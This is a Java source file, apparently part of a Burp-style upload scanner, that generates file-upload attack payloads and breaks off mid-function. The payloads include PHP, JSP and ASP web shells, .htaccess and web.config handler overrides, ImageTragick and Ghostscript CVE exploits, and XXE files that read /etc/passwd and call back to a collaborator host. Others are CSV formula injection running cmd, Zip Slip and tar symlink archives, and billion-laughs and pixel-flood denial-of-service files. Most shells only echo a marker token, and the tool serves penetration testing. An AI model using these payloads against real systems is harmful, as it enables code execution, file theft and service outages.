package com.littlespidy.uploadscanner.engine;

import com.littlespidy.uploadscanner.model.PayloadDefinition;
import com.littlespidy.uploadscanner.model.UploadScannerConfig;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * Created with the help of an AI Agent and littlespidy.
 *
 * Generates file upload attack payloads spanning Web Shells, Image Polyglots,
 * Path Traversal, Null Bytes, SVG XSS, and EICAR AV checks.
 *
 * @author littlespidy
 */
public class UploadPayloadGenerator {
    public static final String EXEC_TOKEN = "UPLOAD_SCANNER_EXEC_SUCCESS_";

    /**
     * Generates a curated list of test payloads according to configuration.
     */
    public static List<PayloadDefinition> generatePayloads(UploadScannerConfig config, String baseFilename) {
        return generatePayloads(config, baseFilename, "");
    }

    public static List<PayloadDefinition> generatePayloads(UploadScannerConfig config, String baseFilename, String collaboratorDomain) {
        List<PayloadDefinition> payloads = new ArrayList<>();
        long timestamp = System.currentTimeMillis();
        String token = EXEC_TOKEN + timestamp;
        String collab = (collaboratorDomain != null && !collaboratorDomain.trim().isEmpty())
                ? collaboratorDomain.trim()
                : "collab-test.burpcollaborator.net";

        // ══════════════════════════════════════════════════════════════════
        // CATEGORY 1: SERVER-SIDE CODE EXECUTION (RCE)
        // ══════════════════════════════════════════════════════════════════

        // 1. PHP Web Shells & Bypasses
        if (config.isTestPhp()) {
            payloads.add(new PayloadDefinition(
                    "PHP Info Shell",
                    "Server RCE",
                    "upload_test.php",
                    "application/x-php",
                    "<?php echo '" + token + "'; phpinfo(); ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "PHP Alternative Extension (.phtml)",
                    "Server RCE",
                    "upload_test.phtml",
                    "application/x-phtml",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "PHP Alternative Extension (.php5)",
                    "Server RCE",
                    "upload_test.php5",
                    "application/x-php",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "PHP Phar Archive (.phar)",
                    "Server RCE",
                    "upload_test.phar",
                    "application/octet-stream",
                    "<?php echo '" + token + "'; __HALT_COMPILER(); ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "PHP Null Byte (.php%00.png)",
                    "Server RCE",
                    "upload_test.php%00.png",
                    "image/png",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "PHP Double Extension (.php.jpg)",
                    "Server RCE",
                    "upload_test.php.jpg",
                    "image/jpeg",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            // GIF89a + PHP Polyglot
            String gifPhp = "GIF89a/*\u0000\u0001\u0000\u0001\u0080\u0000\u0000\u0000\u0000\u0000\u00ff\u00ff\u00ff!\u00f9\u0004\u0001\u0000\u0000\u0000\u0000,*/=1; " +
                    "/*\u0000\u0000\u0000\u0000\u0001\u0000\u0001\u0000\u0000\u0002\u0002D\u0001\u0000; " +
                    "*/\n<?php echo '" + token + "'; ?>";
            payloads.add(new PayloadDefinition(
                    "PHP GIF89a Polyglot",
                    "Server RCE",
                    "avatar_php.gif",
                    "image/gif",
                    gifPhp,
                    token
            ));

            // PNG IDAT Chunk PHP Polyglot
            byte[] pngHeader = new byte[] {
                    (byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
                    0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
                    0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
                    0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, (byte) 0xC4, (byte) 0x89
            };
            byte[] phpSnippet = ("\n<?php echo '" + token + "'; ?>").getBytes(StandardCharsets.UTF_8);
            byte[] pngPayload = new byte[pngHeader.length + phpSnippet.length];
            System.arraycopy(pngHeader, 0, pngPayload, 0, pngHeader.length);
            System.arraycopy(phpSnippet, 0, pngPayload, pngHeader.length, phpSnippet.length);
            payloads.add(new PayloadDefinition(
                    "PHP PNG Header Polyglot",
                    "Server RCE",
                    "avatar_php.png",
                    "image/png",
                    pngPayload,
                    token
            ));
        }

        // 2. JSP / JSPX
        if (config.isTestJsp()) {
            payloads.add(new PayloadDefinition(
                    "JSP Scriptlet Shell",
                    "Server RCE",
                    "upload_test.jsp",
                    "application/x-jsp",
                    "<% out.println(\"" + token + "\"); %>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "JSP Expression Language (${...})",
                    "Server RCE",
                    "upload_el.jsp",
                    "application/x-jsp",
                    "${'" + token + "'}",
                    token
            ));

            String jspx = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"2.0\">\n" +
                    "  <jsp:directive.page contentType=\"text/html\"/>\n" +
                    "  <jsp:scriptlet>out.println(\"" + token + "\");</jsp:scriptlet>\n" +
                    "</jsp:root>";
            payloads.add(new PayloadDefinition(
                    "JSPX XML Shell",
                    "Server RCE",
                    "upload_test.jspx",
                    "application/xml",
                    jspx,
                    token
            ));
        }

        // 3. ASP / ASPX
        if (config.isTestAsp()) {
            payloads.add(new PayloadDefinition(
                    "ASP Classic Shell",
                    "Server RCE",
                    "upload_test.asp",
                    "text/asp",
                    "<% Response.Write(\"" + token + "\") %>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "ASPX Inline Shell",
                    "Server RCE",
                    "upload_test.aspx",
                    "application/x-aspx",
                    "<%@ Page Language=\"C#\" %><% Response.Write(\"" + token + "\"); %>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "ASP IIS Semicolon Bypass (.asp;.jpg)",
                    "Server RCE",
                    "upload_test.asp;.jpg",
                    "image/jpeg",
                    "<% Response.Write(\"" + token + "\") %>",
                    token
            ));
        }

        // 4. Apache .htaccess
        if (config.isTestHtaccess()) {
            String htaccess = "AddType application/x-httpd-php .jpg\n" +
                    "AddHandler application/x-httpd-php .jpg\n" +
                    "php_flag engine on\n";
            payloads.add(new PayloadDefinition(
                    "Apache .htaccess AddType Override",
                    "Server RCE",
                    ".htaccess",
                    "text/plain",
                    htaccess,
                    "AddType"
            ));

            payloads.add(new PayloadDefinition(
                    "PHP in JPG (Pair for .htaccess)",
                    "Server RCE",
                    "image_shell.jpg",
                    "image/jpeg",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));
        }

        // 5. IIS web.config
        if (config.isTestWebConfig()) {
            String webConfig = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                    "<configuration>\n" +
                    "  <system.webServer>\n" +
                    "    <handlers accessPolicy=\"Read, Script, Execute\">\n" +
                    "      <add name=\"PHP-FastCGI-JPG\" path=\"*.jpg\" verb=\"*\" modules=\"FastCgiModule\" scriptProcessor=\"C:\\php\\php-cgi.exe\" resourceType=\"Either\" />\n" +
                    "    </handlers>\n" +
                    "  </system.webServer>\n" +
                    "</configuration>";
            payloads.add(new PayloadDefinition(
                    "IIS web.config FastCGI Handler Mapping",
                    "Server RCE",
                    "web.config",
                    "application/xml",
                    webConfig,
                    "FastCgiModule"
            ));
        }

        // 6. CGI Scripts (Perl, Python, Ruby, Shell)
        if (config.isTestCgi()) {
            payloads.add(new PayloadDefinition(
                    "Perl CGI Script",
                    "Server RCE",
                    "upload_test.pl",
                    "application/x-perl",
                    "#!/usr/bin/perl\nprint \"Content-Type: text/plain\\r\\n\\r\\n\";\nprint \"" + token + "\";\n",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "Python CGI Script",
                    "Server RCE",
                    "upload_test.py",
                    "text/x-python",
                    "#!/usr/bin/env python\nprint(\"Content-Type: text/plain\\r\\n\")\nprint(\"" + token + "\")\n",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "Ruby CGI Script",
                    "Server RCE",
                    "upload_test.rb",
                    "application/x-ruby",
                    "#!/usr/bin/ruby\nputs \"Content-Type: text/plain\\r\\n\"\nputs \"" + token + "\"\n",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "Bash / Shell CGI Script",
                    "Server RCE",
                    "upload_test.sh",
                    "application/x-sh",
                    "#!/bin/bash\necho -e \"Content-Type: text/plain\\r\\n\"\necho \"" + token + "\"\n",
                    token
            ));
        }

        // 7. SSI & ESI
        if (config.isTestSsiEsi()) {
            String ssi = "<!--#echo var=\"DATE_LOCAL\" -->\n" +
                    "<!--#exec cmd=\"echo " + token + "\" -->\n" +
                    "<!--#include virtual=\"/etc/passwd\" -->\n";
            payloads.add(new PayloadDefinition(
                    "SSI (Server-Side Includes)",
                    "Server RCE",
                    "upload_test.shtml",
                    "text/html",
                    ssi,
                    token
            ));

            String esi = "<esi:include src=\"http://" + collab + "/esi_callback\" />\n" +
                    "<esi:inline name=\"" + token + "\" fetchable=\"no\">" + token + "</esi:inline>";
            payloads.add(new PayloadDefinition(
                    "ESI (Edge-Side Includes SSRF)",
                    "Server RCE",
                    "upload_test.esi",
                    "text/html",
                    esi,
                    token,
                    collab,
                    true
            ));
        }

        // ══════════════════════════════════════════════════════════════════
        // CATEGORY 2: IMAGE LIBRARY EXPLOITS & CVES
        // ══════════════════════════════════════════════════════════════════

        // 8. ImageTragick (CVE-2016-3714 RCE, CVE-2016-3718 SSRF, Bad Manners XBM)
        if (config.isTestImageTragick()) {
            String mvgRce = "push graphic-context\n" +
                    "viewbox 0 0 640 480\n" +
                    "fill 'url(https://" + collab + "/im_mvg\";echo \"" + token + "\";\")'\n" +
                    "pop graphic-context";
            payloads.add(new PayloadDefinition(
                    "ImageTragick MVG RCE/SSRF (CVE-2016-3714)",
                    "Image Libraries",
                    "imagetragick.mvg",
                    "image/x-magick",
                    mvgRce,
                    token,
                    collab,
                    true
            ));

            String svgImageTragick = "<?xml version=\"1.0\" standalone=\"no\"?>\n" +
                    "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n" +
                    "<svg width=\"640px\" height=\"480px\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n" +
                    "  <image xlink:href=\"https://" + collab + "/im_svg`echo " + token + "`\" x=\"0\" y=\"0\" height=\"640px\" width=\"640px\"/>\n" +
                    "</svg>";
            payloads.add(new PayloadDefinition(
                    "ImageTragick SVG RCE (CVE-2016-3714)",
                    "Image Libraries",
                    "imagetragick.svg",
                    "image/svg+xml",
                    svgImageTragick,
                    token,
                    collab,
                    true
            ));

            // Bad Manners CVE-2018-16323 XBM memory disclosure
            String xbm = "#define xbm_width 16\n" +
                    "#define xbm_height 16\n" +
                    "static char xbm_bits[] = {\n" +
                    "  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\n" +
                    "  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff\n" +
                    "};\n";
            payloads.add(new PayloadDefinition(
                    "ImageMagick Bad Manners Memory Leak (CVE-2018-16323)",
                    "Image Libraries",
                    "bad_manners.xbm",
                    "image/x-xbitmap",
                    xbm,
                    "xbm_bits"
            ));
        }

        // 9. Magick Delegates (MSL, Ephemeral, Text)
        if (config.isTestMagickDelegates()) {
            String msl = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                    "<image>\n" +
                    "  <read filename=\"https://" + collab + "/msl_read.jpg\" />\n" +
                    "  <write filename=\"/dev/null\" />\n" +
                    "</image>";
            payloads.add(new PayloadDefinition(
                    "ImageMagick MSL Delegate SSRF",
                    "Image Libraries",
                    "delegate.msl",
                    "application/xml",
                    msl,
                    "image",
                    collab,
                    true
            ));
        }

        // 10. Ghostscript SAFER Bypass & LFI
        if (config.isTestGhostscript()) {
            String gsPasswd = "%!PS\n" +
                    "/Size 20 def\n" +
                    "/Line 0 def\n" +
                    "/Buf 1024 string def\n" +
                    "/Path 0 newpath def\n" +
                    "/Courier-Bold findfont Size scalefont setfont\n" +
                    "1 1 1 setrgbcolor clippath fill\n" +
                    "0 0 0 setrgbcolor\n" +
                    "(/etc/passwd) .libfile {\n" +
                    "    {\n" +
                    "        dup Buf readline\n" +
                    "        { Path Line moveto show } { showpage quit } ifelse\n" +
                    "        /Line Line Size add def\n" +
                    "    } loop\n" +
                    "} if\n";
            payloads.add(new PayloadDefinition(
                    "Ghostscript /etc/passwd LFI (CVE-2016-7977)",
                    "Image Libraries",
                    "ghostscript_lfi.ps",
                    "application/postscript",
                    gsPasswd,
                    "root:x:0:0"
            ));

            String gsRce = "%!PS\n" +
                    "currentdevice null true mark /OutputFile (%pipe%echo " + token + ")\n" +
                    ".putdeviceparams\n" +
                    "quit\n";
            payloads.add(new PayloadDefinition(
                    "Ghostscript SAFER Pipe RCE (CVE-2017-8291)",
                    "Image Libraries",
                    "ghostscript_rce.eps",
                    "application/postscript",
                    gsRce,
                    token
            ));
        }

        // 11. LibAVFormat SSRF (M3U8 Playlists & AVI)
        if (config.isTestLibavformat()) {
            String m3u8 = "#EXTM3U\r\n" +
                    "#EXT-X-MEDIA-SEQUENCE:0\r\n" +
                    "#EXTINF:10.0,\r\n" +
                    "http://" + collab + "/libav_ssrf.mp4\r\n" +
                    "#EXT-X-ENDLIST\r\n";
            payloads.add(new PayloadDefinition(
                    "LibAVFormat HLS M3U8 SSRF",
                    "Image Libraries",
                    "playlist.m3u8",
                    "application/vnd.apple.mpegurl",
                    m3u8,
                    "EXTM3U",
                    collab,
                    true
            ));
        }

        // ══════════════════════════════════════════════════════════════════
        // CATEGORY 3: XML & DOCUMENT ATTACKS
        // ══════════════════════════════════════════════════════════════════

        // 12. XXE SVG
        if (config.isTestXxeSvg()) {
            String xxeSvg = "<?xml version=\"1.0\" standalone=\"no\"?>\n" +
                    "<!DOCTYPE svg [\n" +
                    "  <!ENTITY % dtd SYSTEM \"http://" + collab + "/svg_collab.dtd\">\n" +
                    "  %dtd;\n" +
                    "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
                    "]>\n" +
                    "<svg width=\"300\" height=\"300\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
                    "  <text x=\"20\" y=\"50\" font-size=\"16\">&xxe;</text>\n" +
                    "</svg>";
            payloads.add(new PayloadDefinition(
                    "SVG XXE (Local File & OOB Callback)",
                    "XML & Documents",
                    "xxe_vector.svg",
                    "image/svg+xml",
                    xxeSvg,
                    "root:x:0:0",
                    collab,
                    true
            ));
        }

        // 13. XXE XML
        if (config.isTestXxeXml()) {
            String xxeXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                    "<!DOCTYPE root [\n" +
                    "  <!ENTITY % oob SYSTEM \"http://" + collab + "/xml_xxe\">\n" +
                    "  %oob;\n" +
                    "  <!ENTITY file SYSTEM \"file:///etc/passwd\">\n" +
                    "]>\n" +
                    "<root><data>&file;</data></root>";
            payloads.add(new PayloadDefinition(
                    "Generic XML XXE Injection",
                    "XML & Documents",
                    "xxe_payload.xml",
                    "application/xml",
                    xxeXml,
                    "root:x:0:0",
                    collab,
                    true
            ));
        }

        // 14. XXE Office OpenXML (DOCX in-memory ZIP)
        if (config.isTestXxeOffice()) {
            byte[] docxBytes = createOfficeDocxXxe(collab);
            payloads.add(new PayloadDefinition(
                    "Microsoft Word (.docx) XXE OOB Injection",
                    "XML & Documents",
                    "document_xxe.docx",
                    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                    docxBytes,
                    "",
                    collab,
                    true
            ));
        }

        // 15. XXE XMP Packet Metadata
        if (config.isTestXxeXmp()) {
            String xmp = "<?xpacket begin=\"\uFEFF\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?>\n" +
                    "<!DOCTYPE rdf:RDF [\n" +
                    "  <!ENTITY % xmp_collab SYSTEM \"http://" + collab + "/xmp_xxe\">\n" +
                    "  %xmp_collab;\n" +
                    "]>\n" +
                    "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\">\n" +
                    "  <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"/>\n" +
                    "</x:xmpmeta>\n" +
                    "<?xpacket end=\"w\"?>";
            payloads.add(new PayloadDefinition(
                    "XMP Metadata Packet XXE Injection",
                    "XML & Documents",
                    "metadata.xmp",
                    "application/rdf+xml",
                    xmp,
                    "xmpmeta",
                    collab,
                    true
            ));
        }

        // 16. PDF Injections (Launch Action, JavaScript, URI Callback)
        if (config.isTestPdfInjections()) {
            String pdfJs = "%PDF-1.4\n" +
                    "1 0 obj\n" +
                    "<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('" + token + "');) >> >>\n" +
                    "endobj\n" +
                    "2 0 obj\n" +
                    "<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n" +
                    "endobj\n" +
                    "3 0 obj\n" +
                    "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\n" +
                    "endobj\n" +
                    "xref\n" +
                    "0 4\n" +
                    "0000000000 65535 f \n" +
                    "0000000009 00000 n \n" +
                    "0000000100 00000 n \n" +
                    "0000000155 00000 n \n" +
                    "trailer\n" +
                    "<< /Size 4 /Root 1 0 R >>\n" +
                    "startxref\n" +
                    "225\n" +
                    "%%EOF";
            payloads.add(new PayloadDefinition(
                    "PDF JavaScript Action Injection",
                    "XML & Documents",
                    "active_script.pdf",
                    "application/pdf",
                    pdfJs,
                    token
            ));

            String pdfCollab = "%PDF-1.7\n" +
                    "1 0 obj <</Type/Catalog/Pages 2 0 R>> endobj\n" +
                    "2 0 obj <</Type/Pages/Kids[3 0 R]/Count 1>> endobj\n" +
                    "3 0 obj <</Type/Page/Parent 2 0 R/AA <</O <</F (http://" + collab + "/pdf_read)/D [0 /Fit]/S /GoToE>>>>>> endobj\n" +
                    "trailer <</Size 4/Root 1 0 R>>\n" +
                    "startxref\n180\n%%EOF";
            payloads.add(new PayloadDefinition(
                    "PDF Out-of-Band Callback (SSRF / NTLM)",
                    "XML & Documents",
                    "callback_probe.pdf",
                    "application/pdf",
                    pdfCollab,
                    "",
                    collab,
                    true
            ));
        }

        // 17. CSV / Spreadsheet Formula Injection
        if (config.isTestCsvFormula()) {
            String csvPayload = "=cmd|' /C calc'!A0\n" +
                    "@SUM(1+1)*cmd|' /C calc'!A0\n" +
                    "-2+3+cmd|' /C nslookup " + collab + "'!A0\n" +
                    "\"" + token + "\",\"FormulaTest\"\n";
            payloads.add(new PayloadDefinition(
                    "CSV Formula Injection (=cmd|...)",
                    "XML & Documents",
                    "report_export.csv",
                    "text/csv",
                    csvPayload,
                    token,
                    collab,
                    true
            ));
        }

        // ══════════════════════════════════════════════════════════════════
        // CATEGORY 4: CLIENT-SIDE & CSP POLYGLOTS
        // ══════════════════════════════════════════════════════════════════

        // 18. HTML XSS
        if (config.isTestXssHtml()) {
            String htmlXss = "<!DOCTYPE html>\n" +
                    "<html>\n" +
                    "<body>\n" +
                    "  <h1>Upload Test</h1>\n" +
                    "  <script>alert('" + token + "');</script>\n" +
                    "  <img src=x onerror=\"alert('" + token + "')\">\n" +
                    "</body>\n" +
                    "</html>";
            payloads.add(new PayloadDefinition(
                    "HTML Stored XSS",
                    "Client-Side",
                    "test_vector.html",
                    "text/html",
                    htmlXss,
                    token
            ));
        }

        // 19. SVG XSS
        if (config.isTestXssSvg()) {
            String svgXss = "<?xml version=\"1.0\" standalone=\"no\"?>\n" +
                    "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n" +
                    "<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
                    "   <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/>\n" +
                    "   <script type=\"text/javascript\">\n" +
                    "      alert('" + token + "');\n" +
                    "   </script>\n" +
                    "</svg>";
            payloads.add(new PayloadDefinition(
                    "SVG Stored XSS",
                    "Client-Side",
                    "vector.svg",
                    "image/svg+xml",
                    svgXss,
                    token
            ));
        }

        // 20. SWF Flash XSS
        if (config.isTestXssSwf()) {
            byte[] swfBytes = createSwfPayload(token);
            payloads.add(new PayloadDefinition(
                    "Adobe Flash SWF XSS",
                    "Client-Side",
                    "vector.swf",
                    "application/x-shockwave-flash",
                    swfBytes,
                    token
            ));
        }

        // 21. JPEG + JavaScript CSP Polyglot (PortSwigger authentic polyglot)
        if (config.isTestPolyglotJpeg()) {
            byte[] jpegPolyglot = createJpegCspPolyglot();
            payloads.add(new PayloadDefinition(
                    "JPEG + JavaScript CSP Polyglot",
                    "Client-Side",
                    "polyglot_csp.jpg",
                    "image/jpeg",
                    jpegPolyglot,
                    "Burp rocks."
            ));
        }

        // 22. GIF89a + JavaScript CSP Polyglot (ThinkFu authentic polyglot)
        if (config.isTestPolyglotGif()) {
            byte[] gifPolyglot = createGifCspPolyglot();
            payloads.add(new PayloadDefinition(
                    "GIF89a + JavaScript CSP Polyglot",
                    "Client-Side",
                    "polyglot_csp.gif",
                    "image/gif",
                    gifPolyglot,
                    "ThinkFu"
            ));
        }

        // ══════════════════════════════════════════════════════════════════
        // CATEGORY 5: ARCHIVES, QUIRKS & DOS
        // ══════════════════════════════════════════════════════════════════

        // 23. Zip Slip Archive Traversal
        if (config.isTestZipSlip()) {
            byte[] zipSlipBytes = createZipSlipArchive(token);
            payloads.add(new PayloadDefinition(
                    "Zip Slip Archive Traversal (../../shell.php)",
                    "Archives & Quirks",
                    "archive_slip.zip",
                    "application/zip",
                    zipSlipBytes,
                    token
            ));
        }

        // 24. Tar Symlink Archive
        if (config.isTestTarSymlink()) {
            byte[] tarBytes = createTarSymlinkArchive("/etc/passwd");
            payloads.add(new PayloadDefinition(
                    "TAR Archive Symlink to /etc/passwd",
                    "Archives & Quirks",
                    "archive_symlink.tar",
                    "application/x-tar",
                    tarBytes,
                    "root:x:0:0"
            ));
        }

        // 25. Upload Quirks (Trailing dot, space, null-byte, mixed-case)
        if (config.isTestUploadQuirks()) {
            payloads.add(new PayloadDefinition(
                    "Quirk: Trailing Dot (.php.)",
                    "Archives & Quirks",
                    "upload_quirk.php.",
                    "application/x-php",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "Quirk: Trailing Space (.php )",
                    "Archives & Quirks",
                    "upload_quirk.php ",
                    "application/x-php",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "Quirk: Mixed Case (.PhP)",
                    "Archives & Quirks",
                    "upload_quirk.PhP",
                    "application/x-php",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));
        }

        // 26. EICAR Standard Anti-Virus Test File
        if (config.isTestEicar()) {
            String eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
            payloads.add(new PayloadDefinition(
                    "EICAR Anti-Virus Test String",
                    "Archives & Quirks",
                    "eicar_av_test.txt",
                    "text/plain",
                    eicar,
                    "EICAR"
            ));
        }

        // 27. DoS: Pixel Flood Image Bomb (Disabled by default)
        if (config.isTestPixelFlood()) {
            byte[] pixelFlood = createPixelFloodPng();
            payloads.add(new PayloadDefinition(
                    "DoS: Pixel Flood PNG (65535x65535)",
                    "Archives & Quirks",
                    "pixel_flood.png",
                    "image/png",
                    pixelFlood,
                    ""
            ));
        }

        // 28. DoS: XML Billion Laughs Bomb (Disabled by default)
        if (config.isTestBillionLaughs()) {
            String billionLaughs = "<?xml version=\"1.0\"?>\n" +
                    "<!DOCTYPE lolz [\n" +
                    " <!ENTITY lol \"lol\">\n" +
                    " <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n" +
                    " <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n" +
                    " <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n" +
                    " <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n" +
                    " <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n" +
                    "]>\n" +
                    "<lolz>&lol5;</lolz>";
            payloads.add(new PayloadDefinition(
                    "DoS: XML Billion Laughs Expansion",
                    "Archives & Quirks",
                    "billion_laughs.xml",
                    "application/xml",
                    billionLaughs,
                    ""
            ));
        }

        return payloads;
    }

    // ──────────────────────────────────────────────────────────────────
    // In-Memory Binary & Archive Builders
    // ──────────────────────────────────────────────────────────────────

    /**
     * Builds a valid Microsoft Word (.docx) ZIP package embedding an XXE payload in word/document.xml.
     */
    public static byte[] createOfficeDocxXxe(String collaboratorDomain) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ZipOutputStream zos = new ZipOutputStream(baos)) {
            // 1. [Content_Types].xml
            String contentTypes = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\n" +
                    "  <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\n" +
                    "  <Default Extension=\"xml\" ContentType=\"application/xml\"/>\n" +
                    "  <Override PartName=\"/word/document.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml\"/>\n" +
                    "</Types>";
            zos.putNextEntry(new ZipEntry("[Content_Types].xml"));
            zos.write(contentTypes.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            // 2. _rels/.rels
            String rels = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\n" +
                    "  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"word/document.xml\"/>\n" +
                    "</Relationships>";
            zos.putNextEntry(new ZipEntry("_rels/.rels"));
            zos.write(rels.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            // 3. word/document.xml with XXE injection
            String docXml = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<!DOCTYPE test [\n" +
                    "  <!ENTITY % xxe SYSTEM \"http://" + collaboratorDomain + "/docx_xxe\">\n" +
                    "  %xxe;\n" +
                    "]>\n" +
                    "<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\">\n" +
                    "  <w:body>\n" +
                    "    <w:p><w:r><w:t>UploadScanner XXE Verification Document</w:t></w:r></w:p>\n" +
                    "  </w:body>\n" +
                    "</w:document>";
            zos.putNextEntry(new ZipEntry("word/document.xml"));
            zos.write(docXml.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();
        } catch (IOException ignored) {}
        return baos.toByteArray();
    }

    /**
     * Builds a valid ZIP archive containing Zip Slip directory traversal entries.
     */
    public static byte[] createZipSlipArchive(String token) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ZipOutputStream zos = new ZipOutputStream(baos)) {
            ZipEntry slip1 = new ZipEntry("../../../../traversal_shell.php");
            zos.putNextEntry(slip1);
            zos.write(("<?php echo '" + token + "'; ?>").getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            ZipEntry slip2 = new ZipEntry("../../web.config");
            zos.putNextEntry(slip2);
            zos.write(("<configuration><!-- " + token + " --></configuration>").getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();
        } catch (IOException ignored) {}
        return baos.toByteArray();
    }

    /**
     * Builds a minimal TAR archive containing a symlink entry to targetPath.
     */
    public static byte[] createTarSymlinkArchive(String targetPath) {
        byte[] tarBlock = new byte[1024];
        byte[] nameBytes = "symlink_file".getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(nameBytes, 0, tarBlock, 0, Math.min(nameBytes.length, 99));

        byte[] mode = "0000777\0".getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(mode, 0, tarBlock, 100, mode.length);

        byte[] size = "00000000000\0".getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(size, 0, tarBlock, 124, size.length);

        tarBlock[156] = '2'; // Typeflag 2 = Symbolic link

        byte[] linkBytes = targetPath.getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(linkBytes, 0, tarBlock, 157, Math.min(linkBytes.length, 99));

        byte[] magic = "ustar  \0".getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(magic, 0, tarBlock, 257, magic.length);

        int checksum = 8 * ' ';
        for (int i = 0; i < 512; i++) {
            if (i < 148 || i >= 156) {
                checksum += (tarBlock[i] & 0xFF);
            }
        }
        String chkStr = String.format("%06o\0 ", checksum);
        byte[] chkBytes = chkStr.getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(chkBytes, 0, tarBlock, 148, Math.min(chkBytes.length, 8));

        return tarBlock;
    }

    /**
     * Builds a 1x1 PNG image with dimensions modified to 65535x65535 (Pixel Flood DoS).
     */
    public static byte[] createPixelFloodPng() {
        return new byte[] {
                (byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
                0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
                (byte) 0x00, (byte) 0x00, (byte) 0xFF, (byte) 0xFF,
                (byte) 0x00, (byte) 0x00, (byte) 0xFF, (byte) 0xFF,
                0x08, 0x06, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00
